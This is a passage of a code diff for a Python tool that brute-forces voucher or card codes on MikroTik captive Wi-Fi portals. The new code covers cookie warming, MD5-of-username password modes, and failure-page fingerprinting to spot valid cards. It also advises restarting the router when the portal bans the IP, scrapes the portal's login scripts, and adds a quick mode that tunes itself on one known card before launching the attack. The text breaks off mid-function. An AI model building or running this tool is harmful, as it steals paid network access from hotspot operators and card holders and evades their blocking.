@@ -6,12 +6,13 @@ import math
 import time
 import queue
 import random
+import hashlib
 import threading
 from copy import deepcopy
 from random import choices
 from collections import Counter
 from datetime import datetime
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin, parse_qs
 
 import requests
 import urllib3
@@ -52,6 +53,7 @@ try:
 except NameError:
     SCRIPT_DIR = os.getcwd()
 DB_FILE = os.path.join(SCRIPT_DIR, 'mikrotikbf_profiles.json')
+HITS_FILE = os.path.join(SCRIPT_DIR, 'kirapass_hits.txt')
 
 HEADERS = {
     "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -224,6 +226,22 @@ def close_thread_session():
         except Exception:
             pass
         _tls.session = None
+        _tls.warmed = False
+
+
+def _warm_session(s, p):
+    """v3.8: browsers GET the login page first so the portal sets its cookies;
+    a POST without those cookies is rejected by many captive portals.
+    One warm GET per session makes it carry them (flag lives on the session
+    itself so fresh sessions are always warmed - v3.9)."""
+    if getattr(s, '_kp_warmed', False):
+        return
+    try:
+        s.get(p['login_url'], timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
+              verify=False, allow_redirects=True)
+    except Exception:
+        pass
+    s._kp_warmed = True
 
 
 def test_connection(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), tries=3):
@@ -254,25 +272,38 @@ def test_connection(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), tries=3):
         raise last
     raise requests.exceptions.ConnectionError('unreachable')
 
+def _apply_fields(p, u, pw):
+    """builds the submitted field dict: user, password (per pass_mode),
+    dst/popup extras, and any user-defined fixed fields."""
+    f = {p.get('user_field', 'username'): u}
+    pm = p.get('pass_mode', 'same')
+    if pm == 'same':
+        if pw is not None:
+            f[p.get('pass_field', 'password')] = pw
+    elif pm == 'empty':
+        f[p.get('pass_field', 'password')] = ''
+    elif pm == 'fixed':
+        f[p.get('pass_field', 'password')] = p.get('pass_fixed', '')
+    elif pm == 'md5user':
+        # v3.7: password = hexMD5(username) - the common doLogin() formula
+        f[p.get('pass_field', 'password')] = hashlib.md5(
+            u.encode('utf-8')).hexdigest()
+    # pm == 'omit' -> no password field at all
+    if p.get('extras'):
+        f[p.get('dst_field', 'dst')] = p.get('dst_value', '')
+        f[p.get('popup_field', 'popup')] = 'true'
+    for k, v in (p.get('fixed_fields') or {}).items():
+        f[k] = v
+    return f
+
+
 def _raw_send(s, p, u, pw, timeout):
+    f = _apply_fields(p, u, pw)
     if p.get('method') == '2':
-        data = {p.get('user_field', 'username'): u}
-        if pw is not None:
-            data[p.get('pass_field', 'password')] = pw
-        if p.get('extras'):
-            data[p.get('dst_field', 'dst')] = ''
-            data[p.get('popup_field', 'popup')] = 'true'
-        return s.post(p['login_url'], data=data,
-                      timeout=timeout, verify=False, allow_redirects=True)
-    else:
-        params = {p.get('user_field', 'username'): u}
-        if pw is not None:
-            params[p.get('pass_field', 'password')] = pw
-        if p.get('extras'):
-            params[p.get('dst_field', 'dst')] = ''
-            params[p.get('popup_field', 'popup')] = 'true'
-        return s.get(p['login_url'], params=params,
-                     timeout=timeout, verify=False, allow_redirects=True)
+        return s.post(p['login_url'], data=f,
+                      timeout=timeout, verify=False, allow_redirects=False)
+    return s.get(p['login_url'], params=f,
+                 timeout=timeout, verify=False, allow_redirects=False)
 
 
 def send_login(p, u, pw, session=None,
@@ -283,6 +314,7 @@ def send_login(p, u, pw, session=None,
     A thread-local flag records that a retry happened (for the report).
     """
     s = session or thread_session()
+    _warm_session(s, p)
     try:
         resp = _raw_send(s, p, u, pw, timeout)
         _tls.retried = False
@@ -293,6 +325,7 @@ def send_login(p, u, pw, session=None,
         if retry_stale and kind in ('stale_keepalive', 'conn_reset'):
             close_thread_session()
             s2 = session or thread_session()
+            _warm_session(s2, p)
             resp = _raw_send(s2, p, u, pw, timeout)
             _tls.retried = True
             return resp
@@ -303,6 +336,7 @@ def send_login(p, u, pw, session=None,
 def is_successful(p, resp, keyword):
     try:
         url = (resp.url or '').lower()
+        loc = (resp.headers.get('Location') or '').lower()
         html = (resp.text or '').lower()
     except Exception:
         return False
@@ -315,18 +349,18 @@ def is_successful(p, resp, keyword):
     surl = p.get('success_url')
     if surl:
         a = urlparse(surl)
-        if a.path not in ('', '/') and same_path(surl, resp.url or ''):
+        if a.path not in ('', '/') and (same_path(surl, url) or a.path in loc):
             return True
-    if '/status' in url:
+    sc = (p.get('success_url_contains') or '').strip().lower()
+    if sc and (sc in url or sc in loc):
         return True
-    for h in (getattr(resp, 'history', None) or []):
-        if '/status' in (h.url or '').lower():
-            return True
+    if '/status' in url or '/status' in loc:
+        return True
     for f in FAILURE_SIGNS:
         if f in html:
             return False
     kw = (keyword or '').strip().lower()
-    if kw and (kw in html or kw in url):
+    if kw and (kw in html or kw in url or kw in loc):
         return True
 
     return False
@@ -355,6 +389,10 @@ def learn_success_page(p):
     if not u:
         print(f'{red} * Cancelled.{white}')
         return False
+    if not w:
+        w = u
+        print(f'{gray} * Password left empty - using the username as the '
+              f'password (username = password shape).{white}')
 
     try:
         ok_resp = send_login(p, u, w, timeout=(4, 8))
@@ -433,9 +471,42 @@ def ask_method_and_fields(p):
         p['extras'] = ask_yn(' -> Send Mikrotik hidden fields (dst/popup)?', default_yes=True)
         if p['extras']:
             p['dst_field']   = input(f' -> dst field   {green}(Enter=dst){white}   : ').strip() or 'dst'
+            p['dst_value']   = input(f' -> dst value   {green}(Enter = empty, or the URL shown in the login page address bar, e.g. http://www.msftconnecttest.com/redirect){white} : ').strip()
             p['popup_field'] = input(f' -> popup field {green}(Enter=popup){white} : ').strip() or 'popup'
     else:
         p['extras'] = ask_yn(' -> Also send dst/popup in the GET query?', default_yes=True)
+        if p['extras']:
+            p['dst_value'] = input(f' -> dst value   {green}(Enter = empty){white} : ').strip()
+
+    print(f'''{yellow}
+ Password value to send:
+  1) same as card/user (default)
+  2) empty string      (some portals force it to "")
+  3) omit the field entirely
+  4) a fixed value
+  5) hexMD5(username)  (portals whose doLogin() hashes the username){white}''')
+    c = input(f'{white} -> Password value {green}(1/2/3/4/5, Enter=1){white} : ').strip()
+    if c == '2':
+        p['pass_mode'] = 'empty'
+    elif c == '3':
+        p['pass_mode'] = 'omit'
+    elif c == '4':
+        p['pass_mode'] = 'fixed'
+        p['pass_fixed'] = input(f' -> Fixed password value : ').strip()
+    elif c == '5':
+        p['pass_mode'] = 'md5user'
+    else:
+        p['pass_mode'] = 'same'
+
+    raw = input(f' -> Extra fixed fields {green}(name=value, comma separated, Enter=none){white} : ').strip()
+    if raw:
+        ff = {}
+        for part in raw.split(','):
+            if '=' in part:
+                k, v = part.split('=', 1)
+                ff[k.strip()] = v.strip()
+        if ff:
+            p['fixed_fields'] = ff
 
 
 def ask_network_shape(p):
@@ -508,12 +579,18 @@ def print_profile_summary(p):
     tried_line = ''
     if p.get('guess_mode') == '2':
         tried_line = f'\n | {cyan}Tried   :{white} {fmt_int(tried_n)} cards excluded so far'
+    pm = p.get('pass_mode', 'same')
+    shape_line = f'\n | {cyan}PassVal :{white} {pm}' + (f'="{p.get("pass_fixed", "")}"' if pm == 'fixed' else '')
+    ff = p.get('fixed_fields') or {}
+    ff_line = f'\n | {cyan}Fixed   :{white} ' + (', '.join(f'{k}={v}' for k, v in ff.items()) if ff else 'none')
+    sc = p.get('success_url_contains')
+    sc_line = f'\n | {cyan}SuccIn  :{white} {sc}' if sc else ''
     print(f'''
  {white}.------------------------------------------.
  | {cyan}URL     :{white} {p["login_url"]}
  | {cyan}Method  :{white} {method}
  | {cyan}Type    :{white} {nt}  ({shape})
- | {cyan}Mode    :{white} {mode}{tried_line}
+ | {cyan}Mode    :{white} {mode}{tried_line}{shape_line}{ff_line}{sc_line}
  | {cyan}Learned :{white} {learned}
  '------------------------------------------' ''')
 
@@ -674,44 +751,6 @@ def space_line(p, walk=None, space=None, sent=None):
         txt += f'  |  this run: {fmt_int(sent)} distinct'
     return txt
 
-def progress_updater(shared, total, lock, stop_event, t0):
-    announced = False
-    while not stop_event.is_set():
-        with lock:
-            tested = shared['tested']
-            errors = shared['errors']
-            found  = shared['found']
-            top    = top_error(shared['error_kinds'])
-            una    = shared['unreachable']
-            last_card = shared.get('last_card', '')
-            last_status = shared.get('last_status')
-            hist = shared['http_status'].most_common(3)
-        elapsed = time.time() - t0
-        speed = tested / elapsed if elapsed > 0 else 0.0
-        pct = min((tested / total * 100.0) if total > 0 else 100.0, 100.0)
-        blocks = int(pct / 5)
-        bar = '=' * blocks + '-' * (20 - blocks)
-        extra = f'  {red}top:{top}{white}' if top else ''
-        card_txt = last_card if len(last_card) <= 18 else last_card[:15] + '...'
-        st_txt = (f'HTTP {last_status}' if last_status is not None
-                  else 'no reply yet')
-        hist_txt = ' '.join(f'{c}x{n}' for c, n in hist) if hist else '-'
-        print(f'\r {blue}[{bar}]{white} {pct:5.1f}%  {gray}|{white} '
-              f'{tested}/{total}  {gray}|{white} '
-              f'card: {cyan}{card_txt or "-"}{white}  {gray}|{white} '
-              f'{st_txt}  {gray}|{white} {hist_txt}  {gray}|{white} '
-              f'Err:{errors}  {gray}|{white} {speed:5.1f}/s{extra}   ',
-              end='', flush=True)
-        if found and not announced:
-            announced = True
-            print(f'\n\n {green}* MATCH FOUND - finishing...{white}\n')
-        if una:
-            print(f'\n\n {red}* TARGET UNREACHABLE - stopping...{white}\n')
-            break
-        time.sleep(0.08)
-
-
-
 def attack(p, count, threads_count, keyword):
     lock = threading.Lock()
     stop_event = threading.Event()
@@ -765,6 +804,51 @@ def attack(p, count, threads_count, keyword):
         'latencies': [],
     }
 
+    total = effective
+    width = len(str(total))
+
+    # v3.5 fingerprints: the plain login page and one deliberate wrong-card
+    # reply, so every attempt can be judged against the failure baseline.
+    base_d = None
+    try:
+        b = test_connection(p['login_url'], tries=1)
+        base_d = {'status': b.status_code, 'len': len(b.text or '')}
+    except Exception:
+        base_d = None
+    wrong_d = None
+    wrong_sha = None
+    try:
+        # v3.11: TWO wrong-card probes. If both replies are byte-identical the
+        # failure page is static and we can compare attempts by exact content
+        # (sha256) instead of the old +/-40 length tolerance - which swallowed
+        # success pages that were only a few bytes off the failure page.
+        wz = ''.join(choices('zqx9', k=8))
+        w = send_login(p, wz, wz, retry_stale=False)
+        wz2 = ''.join(choices('zqx9', k=8))
+        w2 = send_login(p, wz2, wz2, retry_stale=False)
+        wrong_d = {'status': w.status_code, 'len': len(w.text or ''),
+                   'blocked': _looks_blocked(w.text or '')}
+        n1 = _normalize_page(w.text or '', (wz, wz))
+        n2 = _normalize_page(w2.text or '', (wz2, wz2))
+        if n1 == n2:
+            wrong_sha = hashlib.sha256(
+                n1.encode('utf-8', 'replace')).hexdigest()
+        else:
+            print(f' {yellow}! failure page is dynamic even after masking '
+                  f'timestamps/uuids - falling back to length tolerance'
+                  f'{white}')
+    except Exception:
+        wrong_d = None
+    print(f' {gray}baseline login page: {base_d} | wrong-card reply: '
+          f'{wrong_d}{" (exact-match mode)" if wrong_sha else ""}{white}')
+    try:
+        if wrong_d and _looks_blocked(w.text):
+            print(f' {red}* WARNING: the portal served its BLOCKED page to a '
+                  f'plain wrong card - your IP may already be banned '
+                  f'(restart the router to get a new IP).{white}')
+    except Exception:
+        pass
+
     def note_response(status):
         """an HTTP reply arrived -> network alive, reset the silence counter."""
         with lock:
@@ -795,6 +879,7 @@ def attack(p, count, threads_count, keyword):
                 shared['unreachable_kind'] = kind
                 shared['unreachable_reason'] = ('never answered' if never_answered
                                                 else f'silent for {silent:.0f}s')
+                print(f'\n {red}* TARGET UNREACHABLE - stopping...{white}\n')
                 stop_event.set()
 
     def do_attempt(u, pw):
@@ -827,26 +912,69 @@ def attack(p, count, threads_count, keyword):
         if resp is None:
             return
         dt = time.time() - t0
-        with lock:
-            shared['latencies'].append(round(dt * 1000))
-            if getattr(_tls, 'retried', False):
-                shared['retried'] += 1
-        note_response(getattr(resp, 'status_code', 0))
-        with lock:
-            shared['last_card'] = u
-            shared['last_status'] = getattr(resp, 'status_code', 0)
+        st = getattr(resp, 'status_code', 0)
+        loc = resp.headers.get('Location') or ''
+        ln = len(resp.text or '')
 
         ok = False
         if not stop_event.is_set():
             ok = is_successful(p, resp, keyword)
         if ok:
-            with lock:
-                if not shared['found']:
-                    shared['found'] = True
-                    shared['user'], shared['pw'] = u, pw
-                    stop_event.set()
+            verdict = f'SUCCESS -> {loc[:48]}' if loc else 'SUCCESS'
+        elif 300 <= st < 400 and loc:
+            verdict = f'REDIRECT -> {loc[:48]}'
+        elif _looks_blocked(resp.text or '') and not (
+                wrong_d and wrong_d.get('blocked')):
+            verdict = 'BLOCKED page - your IP got banned mid-run'
+        elif wrong_d and st == wrong_d['status'] and (
+                (hashlib.sha256(_normalize_page(resp.text or '', (u, pw))
+                                .encode('utf-8', 'replace')).hexdigest()
+                 == wrong_sha) if wrong_sha is not None
+                else abs(ln - wrong_d['len']) <= 40):
+            verdict = 'same as failure'
+        elif (base_d and st == base_d['status'] and not loc
+              and abs(ln - base_d['len']) <= 40):
+            verdict = 'login page again'
+        else:
+            verdict = f'DIFFERENT page len={ln}'
+
         with lock:
+            shared['latencies'].append(round(dt * 1000))
+            if getattr(_tls, 'retried', False):
+                shared['retried'] += 1
             shared['tested'] += 1
+            n = shared['tested']
+            shared['last_card'] = u
+            shared['last_status'] = st
+        note_response(st)
+        col = green if ok else (yellow if verdict.startswith(
+            ('REDIRECT', 'DIFFERENT')) else white)
+        strong = ok or verdict.startswith('DIFFERENT')
+        with lock:
+            print(f' {gray}#{n:0{width}d}/{total}{white} '
+                  f'{n / total * 100:5.1f}%  card: {cyan}{u}{white}  | '
+                  f'HTTP {st} | {col}{verdict}{white}')
+            if strong and not shared['found']:
+                shared['found'] = True
+                shared['user'], shared['pw'] = u, pw
+                shared['suspected'] = not ok
+
+        if ok or verdict.startswith(('REDIRECT', 'DIFFERENT')):
+            try:
+                with open(HITS_FILE, 'a', encoding='utf-8') as f:
+                    f.write(f'{datetime.now():%Y-%m-%d %H:%M:%S} #{n} '
+                            f'card={u} status={st} loc={loc} len={ln} '
+                            f'verdict={verdict}\n')
+            except OSError:
+                pass
+        if strong:
+            if ok:
+                print(f'\n {green}* MATCH FOUND - finishing...{white}\n')
+            else:
+                print(f'\n {green}* SUSPECTED MATCH - this card got a page '
+                      f'different from every wrong card - finishing...'
+                      f'{white}\n')
+            stop_event.set()
 
     def worker():
         while True:
@@ -881,11 +1009,6 @@ def attack(p, count, threads_count, keyword):
               f'of the remaining combos - with zero repeats.{white}')
 
     t0 = time.time()
-    prog = threading.Thread(target=progress_updater,
-                            args=(shared, effective, lock, stop_event, t0),
-                            daemon=True)
-    prog.start()
-
     task_q = queue.Queue(maxsize=max(10, threads_count * 2))
 
     workers = [threading.Thread(target=worker, daemon=True)
@@ -1117,6 +1240,7 @@ def _shape_send(p, method, user, pw, extras):
 def _describe_resp(resp, base):
     """details of one request compared to the original login page."""
     url = resp.url or ''
+    loc = resp.headers.get('Location') or ''
     html = resp.text or ''
     low = html.lower()
     fail = next((f for f in FAILURE_SIGNS if f in low), None)
@@ -1125,10 +1249,11 @@ def _describe_resp(resp, base):
     return {
         'status': getattr(resp, 'status_code', 0),
         'url': url,
+        'loc': loc,
         'len': len(html),
         'fail': fail,
         'login_page': same_path_as_base and size_same,
-        'status_page': '/status' in url.lower(),
+        'status_page': ('/status' in url.lower()) or ('/status' in loc.lower()),
         'text': html,
     }
 
@@ -1350,6 +1475,41 @@ def _probe(p, n, threads_count, label):
     return stats, err_rate
 
 
+def _looks_blocked(text):
+    """v3.13: recognize the actual ban page. Note: the string
+    'blocked.html' also appears inside the portal's checkCookie JS on EVERY
+    page, so only explicit ban wording counts."""
+    low = (text or '')[:6000].lower()
+    return ('you are blocked' in low or 'your ip is blocked' in low
+            or 'ip has been blocked' in low or 'access blocked' in low
+            or '<title>blocked' in low or 'too many attempts' in low
+            or 'too many login attempts' in low)
+
+
+def _normalize_page(text, extra=()):
+    """v3.13: mask the parts of a reply that legitimately change between
+    two identical requests (timestamps, uuids, nonces, the echoed
+    username/password) so pages can still be compared exactly even when the
+    portal renders dynamic values into them."""
+    t = text or ''
+    for s in extra:
+        if s:
+            t = t.replace(s, '#')
+    t = re.sub(r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-'
+               r'[0-9a-fA-F]{4}-[0-9a-fA-F]{12}', '#', t)
+    t = re.sub(r'[0-9a-fA-F]{16,}', '#', t)   # long hex/uuid BEFORE digits
+    t = re.sub(r'\d{4,}', '#', t)
+    return t
+
+
+def _distinct_words(good_text, bad_text, limit=6):
+    """v3.10: words present in the good-card reply but absent from the
+    wrong-card reply - ready-made success keyword candidates."""
+    gw = set(re.findall(r'[a-zA-Z]{5,}', (good_text or '').lower()))
+    bw = set(re.findall(r'[a-zA-Z]{5,}', (bad_text or '').lower()))
+    return sorted(gw - bw, key=len, reverse=True)[:limit]
+
+
 def diagnose_flow():
     db = load_db()
     p = choose_profile(db)
@@ -1544,6 +1704,9 @@ def create_profile_flow():
     if not keyword and not (p.get('success_signature') or p.get('success_url')):
         keyword = input(f'{white} -> Success Keyword {green}(Enter = status){white} : ').strip() or 'status'
     p['keyword'] = keyword
+    sc = input(f'{white} -> Success URL contains {green}(e.g. msftconnecttest.com, Enter=none){white} : ').strip()
+    if sc:
+        p['success_url_contains'] = sc
 
     if ask_yn(f'{yellow} -> Run diagnostics before attacking? {gray}(recommended)',
               default_yes=True):
@@ -1611,11 +1774,459 @@ def manage_profiles_flow():
             print(f' {green}* Deleted.{white}')
     input(f'{gray} Enter to continue...{white}')
 
+def fetch_scripts_flow():
+    """v3.6: download every script the login page loads (md5.js, doLogin...)
+    into portal_scripts/ and print where the interesting functions live."""
+    print(f'''{cyan}
+ +-- Fetch portal scripts ---------------------+
+ | {gray}Downloads every <script src=...> and inline   |{white}
+ | {gray}<script> block of the login page, saves them  |{white}
+ | {gray}to portal_scripts/ and shows where doLogin /  |{white}
+ | {gray}md5 / chap logic is defined.                  |{white}
+{cyan} +---------------------------------------------+{white}''')
+    raw = input(f'{white} -> Login URL {green}(ex: http://t.com/login){white} : ').strip()
+    url = normalize_url(raw)
+    if not url:
+        return
+    print(f'{yellow} > Fetching login page...{white}')
+    try:
+        r = test_connection(url)
+    except Exception as e:
+        kind, short = classify_error(e)
+        print(f'{red} * Cannot reach the page [{kind}]: {short}{white}')
+        return
+    page_html = r.text or ''
+    base = r.url or url
+    print(f'{green} * Got the page: HTTP {r.status_code}, {len(page_html)} bytes{white}')
+
+    out_dir = os.path.join(SCRIPT_DIR, 'portal_scripts')
+    os.makedirs(out_dir, exist_ok=True)
+
+    srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', page_html, re.I)
+    inlines = re.findall(r'<script(?![^>]*src)[^>]*>(.*?)</script>',
+                         page_html, re.I | re.S)
+
+    saved = []
+    for i, block in enumerate(inlines, 1):
+        if block.strip():
+            name = f'inline_{i}.js'
+            with open(os.path.join(out_dir, name), 'w', encoding='utf-8') as f:
+                f.write(block)
+            saved.append((name, block))
+            print(f' {green}* saved inline script #{i} -> '
+                  f'portal_scripts/{name} ({len(block)} bytes){white}')
+
+    for s in srcs:
+        full = urljoin(base, s)
+        name = re.sub(r'[^A-Za-z0-9._-]', '_', s.split('/')[-1]) or 'script.js'
+        try:
+            rr = requests.get(full, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
+                              verify=False)
+            body = rr.text or ''
+            with open(os.path.join(out_dir, name), 'w', encoding='utf-8') as f:
+                f.write(body)
+            saved.append((name, body))
+            print(f' {green}* fetched {full} -> portal_scripts/{name} '
+                  f'({len(body)} bytes){white}')
+        except Exception as e:
+            kind, short = classify_error(e)
+            print(f' {red}* FAILED {full} [{kind}]: {short}{white}')
+
+    if not saved:
+        print(f' {yellow}! No scripts found in the page.{white}')
+        return
+
+    print(f'\n {cyan}SEARCHING FOR THE HIDDEN LOGIC...{white}')
+    found_any = False
+    for name, body in saved:
+        low = body.lower()
+        for key in ('dologin', 'md5', 'chap', 'challenge', 'hash', 'rem('):
+            idx = low.find(key)
+            while idx != -1:
+                found_any = True
+                snippet = body[max(0, idx - 150): idx + 650]
+                print(f'\n {yellow}--- {name}: "{key}" at char {idx} ---{white}')
+                print(f' {gray}{snippet}{white}')
+                idx = low.find(key, idx + len(key))
+                break  # one window per key per file is enough
+    if not found_any:
+        print(f' {yellow}! doLogin/md5/chap not found in the fetched scripts. '
+              f'The logic may live in another file - check portal_scripts/ '
+              f'and the page source for more <script> tags.{white}')
+    print(f'\n {green}* All scripts saved under portal_scripts/ - send those '
+          f'files to add the hashing logic to the tool.{white}')
+    input(f'{gray} Enter to continue...{white}')
+
+
+def parse_login_form(html_text, base_url):
+    """v3.9: pull the first <form> and its <input> fields out of the login
+    page HTML so the tool copies what the browser would really send."""
+    info = {'action': base_url, 'method': 'post', 'fields': {},
+            'user_field': 'username', 'pass_field': 'password'}
+    m = re.search(r'<form\b[^>]*>', html_text, re.I)
+    if m:
+        tag = m.group(0)
+        a = re.search(r'action\s*=\s*["\']([^"\']+)["\']', tag, re.I)
+        if a:
+            info['action'] = urljoin(base_url, a.group(1))
+        mm = re.search(r'method\s*=\s*["\'](\w+)["\']', tag, re.I)
+        if mm:
+            info['method'] = mm.group(1).lower()
+    for im in re.finditer(r'<input\b[^>]*>', html_text, re.I):
+        tag = im.group(0)
+        nm = re.search(r'name\s*=\s*["\']?([\w\-.]+)', tag, re.I)
+        if not nm:
+            continue
+        name = nm.group(1)
+        vm = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
+        info['fields'][name] = vm.group(1) if vm else ''
+    # v4.0: field detection in two passes - the old one misfired because the
+    # type regex kept the quote and the default 'username' blocked detection.
+    infos = []
+    for im in re.finditer(r'<input\b[^>]*>', html_text, re.I):
+        tag = im.group(0)
+        nm = re.search(r'name\s*=\s*["\']?([\w\-.]+)', tag, re.I)
+        if not nm:
+            continue
+        tm = re.search(r'type\s*=\s*["\']?(\w+)', tag, re.I)
+        infos.append((nm.group(1), (tm.group(1).lower() if tm else '')))
+    pwd = next((n for n, t in infos if t == 'password'), None)
+    if pwd is None:
+        pwd = next((n for n, t in infos
+                    if any(w in n.lower() for w in ('pass', 'pwd'))), None)
+    if pwd:
+        info['pass_field'] = pwd
+    usr = next((n for n, t in infos
+                if n != pwd and t in ('text', 'tel', 'number', 'email')), None)
+    if usr is None:
+        usr = next((n for n, t in infos
+                    if n != pwd and any(w in n.lower()
+                                        for w in ('user', 'login'))), None)
+    if usr:
+        info['user_field'] = usr
+    return info
+
+
+def diagnose_flow():
+    """v3.9: one known-good card is tried with every sensible combination of
+    (password value x dst value). Each case prints one diagnosis line, so the
+    working configuration is found instead of guessed."""
+    print(f'''{yellow}
+ +---------------------------------------------+
+ |  SELF-TEST with one card you KNOW works     |
+ |  The tool reads the login page by itself,   |
+ |  then tries every password/dst combination. |
+ +---------------------------------------------+{white}''')
+    raw = input(f'{white} -> Login URL {green}(ex: http://t.com/login){white} : ')
+    url = normalize_url(raw)
+    if not url:
+        return
+    card = input(f' -> A card/code you know is VALID {green}(works in the browser){white} : ').strip()
+    if not card:
+        print(f'{red} * Nothing entered.{white}')
+        return
+    s = requests.Session()
+    try:
+        r = s.get(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), verify=False,
+                  allow_redirects=True)
+    except Exception as e:
+        kind, short = classify_error(e)
+        print(f'{red} * Cannot open the login page [{kind}]: {short}{white}')
+        input(f'{gray} Enter to continue...{white}')
+        return
+    s.close()
+    page_url = r.url or url
+    form = parse_login_form(r.text or '', page_url)
+    login_url = form['action']
+    method = '2' if form['method'] == 'post' else '1'
+
+    q = parse_qs(urlparse(page_url).query)
+    dst_candidates, seen = [], set()
+    for src in (q.get('dst', [None])[0], form['fields'].get('dst'), ''):
+        if src is not None and src not in seen:
+            seen.add(src)
+            dst_candidates.append(src)
+
+    skip = {form['user_field'].lower(), form['pass_field'].lower(),
+            'dst', 'popup'}
+    fixed = {k: v for k, v in form['fields'].items() if k.lower() not in skip}
+
+    print(f'\n {cyan}* login page read  : form action = {login_url} '
+          f'({form["method"].upper()}){white}')
+    print(f' {cyan}* username field   : {form["user_field"]}   |   '
+          f'password field : {form["pass_field"]}{white}')
+    print(f' {cyan}* form fields found: '
+          f'{", ".join(f"{k}={v!r}" for k, v in form["fields"].items()) or "none"}{white}')
+    print(f' {cyan}* fixed fields kept: '
+          f'{", ".join(f"{k}={v!r}" for k, v in fixed.items()) or "none"}{white}')
+    print(f' {cyan}* dst values to try: '
+          f'{[d if d else "(empty)" for d in dst_candidates]}{white}')
+    print(f'\n {yellow}CASES - one line each, watch for SUCCESS or '
+          f'DIFFERENT:{white}')
+
+    p_base = {'login_url': login_url, 'method': method,
+              'user_field': form['user_field'],
+              'pass_field': form['pass_field'],
+              'extras': True, 'dst_field': 'dst', 'popup_field': 'popup',
+              'pass_mode': 'empty', 'fixed_fields': fixed,
+              'success_url_contains': 'msftconnecttest.com'}
+    pass_modes = [('same', 'same as card'), ('empty', 'empty'),
+                  ('md5user', 'md5(username)'), ('omit', 'field omitted')]
+    wrong = '0' * len(card) if card.strip('0') else '1' * len(card)
+    results = []
+    likely = []
+    for pm, label in pass_modes:
+        for dst in dst_candidates:
+            p = dict(p_base)
+            p['pass_mode'] = pm
+            p['dst_value'] = dst
+            s1 = requests.Session()
+            _warm_session(s1, p)
+            tmo = (CONNECT_TIMEOUT, READ_TIMEOUT)
+            try:
+                resp = _raw_send(s1, p, card, card, tmo)
+                wresp = _raw_send(s1, p, wrong, wrong, tmo)
+            except Exception as e:
+                kind, short = classify_error(e)
+                print(f'  {red}pass={label:<14} dst={dst or "(empty)":<44} -> '
+                      f'ERROR [{kind}] {short}{white}')
+                s1.close()
+                continue
+            ok = is_successful(p, resp, '')
+            body = resp.text or ''
+            wbody = wresp.text or ''
+            loc = resp.headers.get('Location') or ''
+            if ok:
+                verdict = f'{green}SUCCESS{white}'
+                results.append((pm, dst))
+            elif resp.status_code == wresp.status_code and body == wbody:
+                verdict = f'{gray}same reply as a wrong card{white}'
+            else:
+                words = _distinct_words(body, wbody)
+                likely.append((pm, dst, words))
+                verdict = (f'{green}DIFFERENT reply (len {len(body)}) - the '
+                           f'portal ACCEPTED this card (login likely '
+                           f'happened!){white}')
+            extra = f' Loc={loc}' if loc else ''
+            print(f'  pass={label:<14} dst={(dst or "(empty)"):<44} -> '
+                  f'HTTP {resp.status_code}{extra} | {verdict}')
+            s1.close()
+
+    print()
+    num_of = {'same': '1', 'empty': '2', 'omit': '3', 'md5user': '5'}
+    if not results and likely:
+        results = [(pm, dst) for pm, dst, _ in likely]
+    if results:
+        pm, dst = results[0]
+        words = next((w for a, b, w in likely if (a, b) == (pm, dst)), [])
+        num = num_of[pm]
+        print(f' {green}* WORKING SETTING FOUND - create a profile '
+              f'(menu 2) with these answers:{white}')
+        print(f'   - Login URL            : {url}')
+        print(f'   - Method               : {method}')
+        print(f'   - Username field       : {form["user_field"]}')
+        print(f'   - Password field       : {form["pass_field"]}')
+        shape = ('2 (username = password)' if pm == 'same'
+                 else '1 (username only)')
+        print(f'   - Type (network shape) : {shape}')
+        print(f'   - dst value            : {dst if dst else "(leave empty)"}')
+        print(f'   - Password value       : {num}  ({pm})')
+        print(f'   - Extra fixed fields   : '
+              f'{", ".join(f"{k}={v}" for k, v in fixed.items()) or "(none)"}')
+        print(f'   - Success URL contains : msftconnecttest.com')
+        if words:
+            print(f'   - Success Keyword      : {words[0]}')
+            print(f'     (other candidates: {", ".join(words[1:])})')
+        print(f' {yellow}* If SUCCESS was not printed above, the portal answers '
+              f'HTTP 200 with a big page instead of a redirect.{white}')
+        print(f' {yellow}  In menu 2, answer y to "Teach me the SUCCESS page now?"'
+              f' and give it this same card - it learns the page shape.{white}')
+    else:
+        print(f' {yellow}! No combination succeeded for that card.{white}')
+        print(f' {gray}  -> In the browser: F12 -> Network tab -> log in once '
+              f'-> click the login request ->{white}')
+        print(f' {gray}     send its "Form Data" and Request Headers '
+              f'(especially the Cookie line).{white}')
+    input(f'{gray} Enter to continue...{white}')
+
+
+def send_logout(p, url=None, session=None):
+    """v4.0: POST the portal's logout URL (the status page the user pasted
+    has <form action=".../logout">) so a card that was just used for a test
+    or a found match gets released and its balance preserved."""
+    lo = url or p.get('logout_url') or urljoin(p['login_url'], '/logout')
+    s = session or requests.Session()
+    try:
+        return s.post(lo, data={}, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
+                      verify=False, allow_redirects=False)
+    except Exception:
+        return None
+
+
+def quick_mode_flow():
+    """v4.0 QUICK MODE: five questions, everything else is automatic.
+    1) login URL  2) a known-good card  3) prefix  4) full length
+    5) attempts. The tool reads the login page, tunes the password/dst
+    setting with the known card, learns the success page, logs the known
+    card out, saves the profile and starts the attack."""
+    print(f'''{yellow}
+ +---------------------------------------------+
+ |  QUICK MODE - 5 questions, the rest is auto |
+ |  You only need ONE card that works.         |
+ +---------------------------------------------+{white}''')
+    p = {}
+    if not ask_url_and_test(p):
+        return
+    card = input(f'{white} -> A card you KNOW works {green}(logs in with the browser){white} : ').strip()
+    if not card:
+        print(f'{red} * Cancelled - QUICK MODE needs one known-good card.{white}')
+        input(f'{gray} Enter to continue...{white}')
+        return
+    prefix = input(f' -> Card prefix {green}(Enter if none){white} : ').strip()
+    length = ask_int(f'{white} -> Full card length : ', minv=1, maxv=64)
+    var = length - len(prefix)
+    if var <= 0:
+        print(f'{red} * Prefix is longer than the full length!{white}')
+        input(f'{gray} Enter to continue...{white}')
+        return
+
+    print(f'\n {yellow}> Reading the login page...{white}')
+    s = requests.Session()
+    try:
